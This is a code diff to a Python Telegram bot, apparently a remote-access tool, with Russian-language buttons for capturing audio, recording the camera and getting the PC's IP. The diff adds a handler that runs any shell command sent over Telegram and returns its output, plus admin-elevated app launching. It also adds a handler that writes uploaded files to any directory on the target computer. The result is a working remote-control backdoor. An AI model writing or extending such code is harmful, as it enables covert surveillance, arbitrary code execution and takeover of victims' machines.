@@ -12,11 +12,12 @@ from telebot.types import Message
 import requests
 import subprocess
 import webbrowser
-
+import chardet
 
 API = 'TOKEN'
 
 bot = telebot.TeleBot(API)
+
 
 def create_inline_keyboard():
     keyboard = telebot.types.InlineKeyboardMarkup()
@@ -30,7 +31,9 @@ def create_inline_keyboard():
         telebot.types.InlineKeyboardButton('Узнать IP компьютера', callback_data='get_ip'),
         telebot.types.InlineKeyboardButton('Вывести СМС на экран ПК', callback_data='messcren'),
         telebot.types.InlineKeyboardButton('Загуглить на ПК', callback_data='google_search'),
-        telebot.types.InlineKeyboardButton('Перехват звука', callback_data='voice_record')
+        telebot.types.InlineKeyboardButton('Перехват звука', callback_data='voice_record'),
+        telebot.types.InlineKeyboardButton('Управление CMD', callback_data='cmd_open'),
+        telebot.types.InlineKeyboardButton('Закачать файл на ПК', callback_data='upload_file')
     )
     return keyboard
 
@@ -142,6 +145,13 @@ def handle_callback_query(call):
     elif call.data == 'google_search':
         bot.send_message(call.message.chat.id, 'Введите запрос для поиска в Google или веб сайт:')
         bot.register_next_step_handler(call.message, open_website)
+    elif call.data == 'cmd_open':
+        bot.send_message(call.message.chat.id, 'Введите команду для выполнения в командной строке:')
+        bot.register_next_step_handler(call.message, execute_command)
+
+    elif call.data == 'upload_file':
+        bot.send_message(call.message.chat.id, 'Введите путь для сохранения файла на компьютере:')
+        bot.register_next_step_handler(call.message, download_file)
 
     elif call.data == 'camera':
         bot.send_message(call.message.chat.id, 'Введите, сколько времени записывать видео и аудио (в секундах):')
@@ -200,7 +210,6 @@ def record_audio_duration(message: Message):
 
         bot.send_message(message.chat.id, 'Запись завершена. Отправляю...')
 
-        # Send the voice message to the user
         bot.send_chat_action(message.chat.id, 'record_audio')
         with open("temp_audio.wav", "rb") as audio_file:
             bot.send_voice(message.chat.id, audio_file)
@@ -225,11 +234,80 @@ def get_computer_ip(message):
         bot.send_message(message.chat.id, 'Произошла ошибка при получении IP компьютера.')
 
 def show_messagebox(message: Message):
-    # Using subprocess to show a message box
     cmd = f'msg * "{message.text}"'
     subprocess.run(cmd, shell=True)
 
     bot.send_message(message.chat.id, 'Сообщение было получено.')
+
+def execute_command(message: Message):
+    try:
+        command = message.text
+
+        standard_apps = {
+            "notepad": "notepad.exe",
+            "calc": "calc.exe",
+            "cmd": "cmd.exe",
+        }
+
+        if command.lower() in standard_apps:
+            app_name = command.lower()
+            app_path = standard_apps[app_name]
+
+            if os.name == "nt":
+                try:
+                    ctypes.windll.shell32.ShellExecuteW(None, "runas", app_path, None, None, 1)
+                    bot.send_message(message.chat.id, f'{app_name.capitalize()} запущено с правами администратора!')
+                except Exception as e:
+                    bot.send_message(message.chat.id, f'Ошибка при запуске с правами администратора: {e}')
+        else:
+            result = subprocess.check_output(command, shell=True)
+            encoding = chardet.detect(result)['encoding']
+            result = result.decode(encoding, errors='replace')
+            bot.send_message(message.chat.id, f'Результат выполнения команды:\n\n{result}')
+    except subprocess.CalledProcessError as e:
+        bot.send_message(message.chat.id, f'Ошибка выполнения команды: {e}')
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Произошла ошибка: {e}')
+
+
+def ask_file_path(message: Message):
+    bot.send_message(message.chat.id, 'Введите путь для сохранения файла на компьютере:')
+    bot.register_next_step_handler(message, download_file)
+
+def download_file(message: Message):
+    file_path = message.text.strip()
+
+    if not os.path.exists(file_path):
+        bot.send_message(message.chat.id, 'Указанный путь не существует. Пожалуйста, введите корректный путь:')
+        bot.register_next_step_handler(message, download_file)
+        return
+
+    if not os.path.isdir(file_path):
+        bot.send_message(message.chat.id, 'Указанный путь не является директорией. Пожалуйста, введите путь к существующей директории:')
+        bot.register_next_step_handler(message, download_file)
+        return
+
+    bot.send_message(message.chat.id, 'Отправьте мне файл для загрузки на компьютер.')
+    bot.register_next_step_handler(message, save_file, file_path)
+
+def save_file(message: Message, file_path: str):
+    if message.document:
+        try:
+            file_info = bot.get_file(message.document.file_id)
+            downloaded_file = bot.download_file(file_info.file_path)
+
+            file_name = os.path.basename(file_info.file_path)
+            file_full_path = os.path.join(file_path, file_name)
+
+            with open(file_full_path, 'wb') as file:
+                file.write(downloaded_file)
+
+            bot.send_message(message.chat.id, f'Файл успешно сохранен по пути: {file_full_path}')
+        except Exception as e:
+            bot.send_message(message.chat.id, f'Произошла ошибка при сохранении файла: {e}')
+    else:
+        bot.send_message(message.chat.id, 'Пожалуйста, отправьте материал из раздела "файл".')
+        bot.register_next_step_handler(message, save_file, file_path)
 
 
 
